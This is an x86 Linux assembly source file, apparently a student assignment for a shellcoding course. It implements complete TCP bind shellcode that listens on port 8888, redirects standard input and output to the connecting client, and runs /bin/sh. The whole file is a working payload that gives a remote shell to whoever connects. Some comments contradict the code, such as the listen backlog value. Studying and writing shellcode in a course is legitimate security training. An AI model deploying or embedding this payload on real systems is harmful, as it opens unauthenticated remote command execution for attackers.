; SLAE - Assignment 1: TCP Bind Shellcode
; Author: Jesse Nelson
; Student ID: SLAE - 1087
; Purpose: Create a TCP bind shell in assembly in which the port can be easily configured

global _start

section .text

_start:

	;socketcall()
	;eax

	;socket(AF_INET, SOCK_STREAM, 0)
	;ebx     ecx       ebx        esi

	;
	; create a socket
	; socket(2, 1, 0)
	;

	xor eax, eax	; clean eax
	xor ebx, ebx	; clean ebx

	mov al, 0x66	; socketcall() syscall #

	xor esi, esi	; clean esi for IPPROTO = 0

	mov bl, 0x1	; socket() = 1

	push esi		; IPPROTO = 0
	push ebx		; SOCK_STREAM = 1 -- 0x1 from before
	push byte 0x2		; AF_INET = 2

	mov ecx, esp		; save pointer in ecx -- points to socket() args
	int 0x80		; run socket()

	; need to store sockfd somewhere as eax will be overwritten
	; store sockfd into esi

	xchg esi, eax	; sockfd now stored into esi (0x3)
	
	;
	;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	;
		
	mov al,0x66 		; socketcal;() syscall #

	pop ebx 		; take the 2 from the stack to use as bind

	xor edx, edx 		; clear edx to store 0x0 for INADDR_ANY
	push edx 		; INADDR_ANY
	push word 0xb822 	; port = 8888
	push word bx 		; AF_INET = 2

	mov ecx, esp 		; save pointer in ecx -- points to struct

	push 0x10 		; sizeof = 16
	push ecx 		; struck sockaddr pointer
	push esi 		; sockfd / 0x3
	
	mov ecx, esp 		; save pointer in ecx -- points to bind() args
	
	int 0x80 		; run bind()

	;	 
	; listen fo connections
	; listen(sockfd, 2)
	;

	mov al,0x66 	; socketcall() syscall #
	
	mov bl, 0x4

	push ebx 	; backlog = 0
	push esi 	; sockfd / 0x3

	mov ecx,esp 	; save pointer in ecx -- points to listen() args

	int 0x80 	; run listen()

	;
	; accept incoming connections
	; accept(int sockfd, NULL, NULL)
	;

	; edx is currently 0x0 so we can push that onto the stack for the NULL values
	
	mov al, 0x66	; socketcall() syscall #

	push edx	; NULL
	push edx	; NULL
	push esi	; sockfd / 0x3

	mov ecx, esp	; save pointer in ecx -- points to accept() args

	inc ebx 	; add 1 to ebx to make it 0x5 for the accept() syscall # 

	int 0x80	; run accept()

	;
	; input, output, and error redirection
	; dup2
	; dup2(5, (0,1,2))
	;

	xchg ebx, eax	; place clientfd / 0x5 in eax

	xor ecx, ecx	; clear ecx to prep for counter

	mov cl, 0x2	; store 0x2 into ecx for counter

duploop:
	mov al, 0x3f	; dup2() syscall #
	int 0x80	; run dup2
	dec ecx		; dec ecx down
	jns duploop
	
	;
	; execve("/bin//sh", NULL, NULL)  
	;	

	xor eax, eax		; clear eax
	push eax		; push 0x0
	
	push 0x68732f2f     	; hs//  - two slashes are added to make the total value 8 bytes
	push 0x6e69622f     	; nib/  
	mov ebx, esp       	; EBX points to "/bin//sh"  
	
	push eax		; NULL
	mov ecx, esp		; save pointer
	
	push eax		; NULL
	mov edx, esp		; save pointer in ecx -- points to execve() args
	
	mov al, 0xb		; execve() syscall #   
	
    	int 0x80		; run execve()
